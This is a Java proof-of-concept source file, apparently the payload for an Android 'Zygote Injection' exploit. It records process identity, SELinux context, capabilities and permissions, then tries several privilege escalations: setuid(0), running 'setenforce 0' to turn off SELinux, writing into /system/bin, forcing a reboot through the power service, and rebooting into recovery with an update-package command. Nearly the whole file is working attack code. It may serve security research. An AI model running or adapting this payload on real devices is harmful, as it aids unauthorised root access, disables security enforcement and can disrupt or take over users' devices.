package com.poc;

import android.content.pm.IPackageManager;
import android.os.IBinder;
import android.os.IRecoverySystem;
import android.os.IPowerManager;
import android.os.Process;
import android.os.RemoteException;
import android.os.ServiceManager;
import android.system.ErrnoException;
import android.system.Os;
import android.system.OsConstants;
import android.system.StructCapUserData;
import android.system.StructCapUserHeader;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class Main {

    private static final String REPORT_PATH = "/cache/exploit_report.txt";

    public static void main(String[] args) {
        StringBuilder report = new StringBuilder();
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss z", Locale.getDefault());

        report.append("========================================\n");
        report.append("   Zygote Injection - Deep Recon Report\n");
        report.append("   Time: ").append(sdf.format(new Date())).append("\n");
        report.append("========================================\n\n");

        try {
            report.append("--- [1] Basic Process Identity ---\n");
            int uid = Process.myUid();
            int gid = Process.myGid();
            int pid = Process.myPid();
            report.append("UID: ").append(uid).append("\n");
            report.append("GID: ").append(gid).append("\n");
            report.append("PID: ").append(pid).append("\n");

            IPackageManager pm = IPackageManager.Stub.asInterface(ServiceManager.getService("package"));
            if (pm != null) {
                String[] pkgs = pm.getPackagesForUid(uid);
                report.append("Related Packages: ").append(pkgs != null ? String.join(", ", pkgs) : "None").append("\n\n");
            } else {
                report.append("Related Packages: Service not available\n\n");
            }

            // --- [2] SELinux コンテキスト ---
            report.append("--- [2] SELinux Context ---\n");
            report.append("Context: ").append(readFile("/proc/self/attr/current")).append("\n\n");

            // --- [3] Capabilities ---
            report.append("--- [3] Linux Capabilities ---\n");
            report.append(dumpCapabilities()).append("\n");

            // --- [4] システムプロパティ ---
            report.append("--- [4] Key System Properties ---\n");
            report.append("ro.build.version.release: ").append(getProp("ro.build.version.release")).append("\n");
            report.append("ro.build.version.security_patch: ").append(getProp("ro.build.version.security_patch")).append("\n");
            report.append("ro.factorytest: ").append(getProp("ro.factorytest")).append("\n");
            report.append("ro.debuggable: ").append(getProp("ro.debuggable")).append("\n");
            report.append("ro.secure: ").append(getProp("ro.secure")).append("\n\n");

            // --- [5] ファイルシステムアクセス ---
            report.append("--- [5] Filesystem Access Tests ---\n");
            report.append("Write test (/cache/): ").append(writeTest("/cache/test_write.tmp")).append("\n");
            report.append("Write test (current dir): ").append(writeTest("./test_write.tmp")).append("\n");
            report.append("Execute test (/system/bin/sh): ").append(canExecute("/system/bin/sh")).append("\n");
            report.append("Execute test (/data/local/tmp): ").append(canExecute("/data/local/tmp/dummy")).append("\n\n");

            // --- [6] Android パーミッション ---
            report.append("--- [6] Android Runtime Permissions (AIDL) ---\n");
            if (pm != null) {
                String[] perms = {
                    "android.permission.INSTALL_PACKAGES",
                    "android.permission.DELETE_PACKAGES",
                    "android.permission.WRITE_SECURE_SETTINGS",
                    "android.permission.REBOOT",
                    "android.permission.SHUTDOWN",
                    "android.permission.INTERACT_ACROSS_USERS",
                    "android.permission.RECOVERY",
                    "android.permission.DUMP",
                    "android.permission.SET_TIME",
                    "android.permission.SET_TIME_ZONE"
                };
                for (String p : perms) {
                    int res = pm.checkPermission(p, "com.poc", uid);
                    report.append("checkPermission(").append(p).append("): ").append(res == 0 ? "GRANTED" : "DENIED (" + res + ")").append("\n");
                }
            } else {
                report.append("PackageManager service not available\n");
            }
            report.append("\n");

            // --- [7] システムサービスの存在確認 ---
            report.append("--- [7] System Services (AIDL) ---\n");
            report.append("package: ").append(serviceStatus("package")).append("\n");
            report.append("power: ").append(serviceStatus("power")).append("\n");
            report.append("recovery: ").append(serviceStatus("recovery")).append("\n");
            report.append("permission: ").append(serviceStatus("permission")).append("\n\n");

            // --- [8] 権限昇格の試行 ---
            report.append("--- [8] Privilege Escalation Attempts ---\n");

            // setuid(0)
            report.append("[setuid(0)]: ");
            try { Os.setuid(0); report.append("SUCCESS (Root!)\n"); } catch (ErrnoException e) { report.append("FAILED (EPERM)\n"); }

            // setresuid(0,0,0)
            report.append("[setresuid(0,0,0)]: ");
            try { Os.setresuid(0, 0, 0); report.append("SUCCESS\n"); } catch (ErrnoException e) { report.append("FAILED\n"); }

            // /proc/self/oom_score_adj 書き込み
            report.append("[write /proc/self/oom_score_adj]: ");
            try { new FileWriter("/proc/self/oom_score_adj").write("0"); report.append("SUCCESS\n"); } catch (IOException e) { report.append("FAILED\n"); }

            // setenforce 0
            report.append("[setenforce 0]: ");
            try {
                Process p = Runtime.getRuntime().exec(new String[]{"/system/bin/setenforce", "0"});
                int code = p.waitFor();
                report.append(code == 0 ? "SUCCESS (Permissive)\n" : "FAILED (exit=" + code + ")\n");
            } catch (Exception e) { report.append("FAILED\n"); }

            // /system 書き込み
            report.append("[write /system/bin/test]: ");
            try { new FileWriter("/system/bin/test_write", true).write("test"); report.append("SUCCESS\n"); } catch (IOException e) { report.append("FAILED (Read-only)\n"); }

            // setprop
            report.append("[setprop test.prop 1]: ");
            try {
                Class.forName("android.os.SystemProperties").getMethod("set", String.class, String.class)
                        .invoke(null, "test.prop", "1");
                report.append("SUCCESS\n");
            } catch (Exception e) { report.append("FAILED\n"); }

            // IPowerManager.reboot
            report.append("[IPowerManager.reboot]: ");
            IPowerManager pow = IPowerManager.Stub.asInterface(ServiceManager.getService("power"));
            if (pow != null) {
                try { pow.reboot(false, "", false); report.append("SUCCESS (device rebooting)\n"); }
                catch (RemoteException e) { report.append("FAILED (RemoteException)\n"); }
            } else report.append("FAILED (service null)\n");

            // IRecoverySystem.rebootRecoveryWithCommand
            report.append("[IRecoverySystem.rebootRecoveryWithCommand]: ");
            IRecoverySystem rs = IRecoverySystem.Stub.asInterface(ServiceManager.getService("recovery"));
            if (rs != null) {
                try { rs.rebootRecoveryWithCommand("--update_package=/cache/update.zip"); report.append("SUCCESS\n"); }
                catch (RemoteException e) { report.append("FAILED (RemoteException)\n"); }
            } else report.append("FAILED (service null)\n");

            report.append("\n========================================\n");
            report.append("   End of Report\n");
            report.append("========================================\n");

        } catch (Throwable t) {
            report.append("\n!!! CRITICAL EXCEPTION: ").append(t.toString()).append("\n");
            t.printStackTrace();
        }

        // レポート保存
        try {
            saveReport(report.toString());
            System.out.println("[+] Report saved to " + REPORT_PATH);
        } catch (IOException e) {
            System.err.println("[-] Failed to save report: " + e.getMessage());
            try {
                new FileWriter("/data/local/tmp/exploit_report.txt").write(report.toString());
                System.out.println("[+] Saved to /data/local/tmp/exploit_report.txt");
            } catch (IOException ex) {
                System.err.println("[-] Could not save report anywhere.");
            }
        }
    }

    // ----- ユーティリティ -----
    private static void saveReport(String content) throws IOException {
        File reportFile = new File(REPORT_PATH);
        if (!reportFile.getParentFile().exists()) reportFile.getParentFile().mkdirs();
        try (BufferedWriter w = new BufferedWriter(new FileWriter(reportFile))) { w.write(content); }
        try { Os.chmod(REPORT_PATH, OsConstants.S_IRUSR | OsConstants.S_IWUSR | OsConstants.S_IRGRP | OsConstants.S_IROTH); } catch (ErrnoException ignored) {}
    }

    private static String readFile(String path) {
        try { return new String(java.nio.file.Files.readAllBytes(java.nio.file.Paths.get(path))).trim(); }
        catch (Exception e) { return "Error: " + e.getMessage(); }
    }

    private static String dumpCapabilities() {
        try {
            StructCapUserHeader header = new StructCapUserHeader(OsConstants._LINUX_CAPABILITY_VERSION_3, 0);
            StructCapUserData[] data = Os.capget(header);
            return "Effective: " + Long.toHexString(data[0].effective | ((long) data[1].effective << 32)) + "\n" +
                   "Permitted: " + Long.toHexString(data[0].permitted | ((long) data[1].permitted << 32)) + "\n" +
                   "Inheritable: " + Long.toHexString(data[0].inheritable | ((long) data[1].inheritable << 32));
        } catch (ErrnoException e) { return "Failed: " + e.getMessage(); }
    }

    private static String getProp(String key) {
        try { return (String) Class.forName("android.os.SystemProperties").getMethod("get", String.class, String.class).invoke(null, key, "(null)"); }
        catch (Exception e) { return "Error: " + e.getMessage(); }
    }

    private static String writeTest(String path) {
        try { File f = new File(path); new FileWriter(f).write("test"); return f.delete() ? "SUCCESS (write/delete)" : "SUCCESS (write)"; }
        catch (IOException e) { return "FAILED: " + e.getMessage(); }
    }

    private static String canExecute(String path) {
        File f = new File(path);
        if (f.exists()) return f.canExecute() ? "EXECUTABLE" : "NOT EXECUTABLE";
        else { File p = f.getParentFile(); return p != null && p.exists() ? "FILE NOT FOUND, parent exec: " + (p.canExecute() ? "YES" : "NO") : "PATH NOT FOUND"; }
    }

    private static String serviceStatus(String name) {
        try {
            IBinder binder = ServiceManager.getService(name);
            return (binder != null && binder.isBinderAlive()) ? "ALIVE" : "NULL or DEAD";
        } catch (Exception e) { return "Error: " + e.getMessage(); }
    }
}
